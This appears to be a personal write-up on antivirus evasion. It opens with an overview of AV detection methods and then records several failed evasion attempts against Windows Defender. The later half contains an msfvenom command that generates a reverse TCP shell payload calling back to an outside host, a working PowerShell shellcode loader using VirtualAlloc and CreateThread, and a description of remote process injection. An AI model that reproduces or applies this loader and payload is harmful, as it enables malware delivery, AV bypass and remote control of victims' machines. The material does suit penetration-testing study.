
## Background
Antivirus (AV) is a vital application designed to proactively prevent, detect, and eradicate malicious software. Originally, its primary purpose was to combat computer viruses, but its capabilities have expanded to address a wide range of digital threats.

## Examples of Antivirus (AV) Software
1. Windows Defender (Microsoft Defender)
2. McAfee Antivirus
3. Norton Antivirus

## Detection Methods
AV software utilizes various sophisticated detection techniques to identify and neutralize threats effectively:

1. Signature-based Detection: This method involves scanning the filesystem for known malware signatures. If any malicious patterns are detected, the AV software takes appropriate actions.

2. Heuristic-based Detection: Employing advanced algorithms and rules, this approach assesses whether specific actions in a program are deemed malicious. It often entails stepping through the instruction set of a binary file, attempting to disassemble the machine code, and ultimately decompiling and analyzing the source code to gain a comprehensive understanding of the program.

3. Behavioral Detection: AV software executes the suspicious file in an emulated environment, such as a small virtual machine, and observes its behaviors or actions. Any actions considered malicious trigger a response from the AV to contain or remove the threat.

4. Machine Learning Detection: By integrating Machine Learning (ML) algorithms, AV software can detect previously unknown threats by collecting and analyzing additional metadata. This approach enhances the AV's ability to stay ahead of emerging threats.

By combining these powerful detection methods, antivirus applications are constantly updated and refined to safeguard computers and users from the ever-evolving landscape of cybersecurity threats.

## In Memory Evasion
In-Memory Injections, also known as PE Injection, is a popular technique used to bypass antivirus products on Windows machines.
## Remote Process Memory Injection
Remote Process Memory Injection,  attempts to inject the payload into another valid PE that is not malicious.
Use `OpenProcess` function to obtain a valid `HANDLE5` to a target process that we have permission to access. After obtaining the `HANDLE`, we would allocate memory in the context of that process by calling a Windows API such as VirtualAllocEx.6 Once the memory has been allocated in the remote process, we would copy the malicious payload to the newly allocated memory using WriteProcessMemory.7 

# Unsuccessful
1. Powershell Invoke-Stealth. (Caught by Windows Defender) https://github.com/JoelGMSec/Invoke-Stealth
  ![](/assets/Project/Invoke.png)

  Techniques that were utilized in the script:
  Techniques:
       · Chameleon: Substitute strings and concatenate variables
       · BetterXencrypt: Compresses and encrypts with random iterations
       · PyFuscation: Obfuscate functions, variables and parameters
       · ReverseB64: Encode with base64 and reverse it to avoid detections
       · PSObfuscation: Convert content to bytes and encode with Gzip
    However, this was blocked in Windows Defender.
  ![](/assets/Project/PowershellFail.png)

2. ScareCrow (Caught by Window Defender) https://github.com/optiv/ScareCrow 
  ![](/assets/Project/scare.png)
  ![](/assets/Project/One.png)
3. Powershell Remote Process memory Injection (Caught by Windows Defender)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
```

```bash
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

```


This was also blocked by Windows Defender.
## Weaponization

## Reference
- Read team playbook, Offensive Security